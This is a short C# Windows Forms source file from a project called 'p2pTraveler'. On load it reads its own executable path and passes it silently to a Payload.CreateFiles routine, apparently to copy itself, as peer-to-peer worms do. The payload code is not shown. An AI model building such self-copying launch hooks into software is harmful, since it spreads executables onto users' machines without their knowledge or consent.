using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace p2pTraveler
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CreateFiles();
        }
        private void CreateFiles()
        {
            var currentFile = Process.GetCurrentProcess().MainModule.FileName;
            Payload.CreateFiles(currentFile);
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("http://www.github.com/PartTimeLegend/p2pTraveler");
        }
    }
}
